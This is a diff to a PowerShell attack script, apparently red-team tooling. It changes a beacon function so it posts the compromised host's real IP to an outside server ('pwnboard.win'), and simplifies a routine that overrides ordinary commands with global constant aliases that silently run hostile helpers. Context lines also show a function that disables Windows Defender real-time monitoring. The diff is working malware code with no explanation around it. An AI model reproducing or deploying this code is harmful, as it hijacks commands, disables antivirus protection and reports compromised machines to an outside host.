@@ -1,5 +1,5 @@
 $mm = @'
-function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"="192.168.0.5";"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -TimeOutSec 2 -Method Post -UseBasicParsing -Body $p -ContentType "application/json" | Out-Null}Catch{$_}}
+function mm {try {$i=(Test-Connection -ComputerName $env:ComputerName -Count 1).IPV4Address.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic"  -ErrorAction SilentlyContinue -TimeOutSec 2 -Method Post -UseBasicParsing -Body $p -ContentType "application/json" | Out-Null}Catch{$_}}
 '@.Trim()
 $dd = @'
 function dd {Start-Job -ScriptBlock {try{Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue }Catch{$_}} | Out-Null }
@@ -23,7 +23,7 @@ function cool() {
 }
 
 function shim([string]$key, [string]$value) {
-    $y = "function shimmed_$key {$value; Invoke-Expression(`"try{mm}catch{}; try{xx}catch{}; try{dd}catch{}; try{ff}catch{}`")}"
+    $y = "function shimmed_$key {$value; Invoke-Expression(`"xx;dd;ff;mm`")}"
     $tmp = "shimmed_$key"
     $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global' + ' -ErrorAction SilentlyContinue -Force'
     $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
